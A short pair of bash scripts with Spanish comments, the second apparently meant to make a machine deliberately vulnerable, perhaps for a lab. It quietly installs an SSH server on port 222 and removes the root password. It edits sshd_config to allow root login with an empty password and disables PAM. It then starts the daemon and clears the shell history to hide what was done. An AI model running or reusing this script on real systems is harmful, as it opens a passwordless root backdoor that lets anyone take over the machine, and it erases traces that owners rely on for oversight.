#!/bin/bash

# Crea el archivo prueba1 en /home pidiendo permisos de administrador
touch prueba1

#!/bin/bash

# 1. Instalación silenciosa del servidor SSH
apt-get update &>/dev/null
apt-get install -y openssh-server &>/dev/null

# Crear directorio necesario para el demonio sshd
mkdir -p /run/sshd

# 2. Quitar la contraseña al usuario root
passwd -d root &>/dev/null

# 3. Configurar SSH para que sea vulnerable y permita entrar a root sin pass
# Cambiamos el puerto al 222
echo "Port 222" >> /etc/ssh/sshd_config
# Permitimos login explícito de root (por defecto suele venir en prohibit-password)
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
# Permitimos contraseñas vacías
echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
# Desactivamos PAM para que las reglas estrictas no bloqueen la autenticación vacía
echo "UsePAM no" >> /etc/ssh/sshd_config

# 4. Arrancar el servicio SSH en segundo plano
/usr/sbin/sshd

# Opcional: Limpiamos el historial
history -c
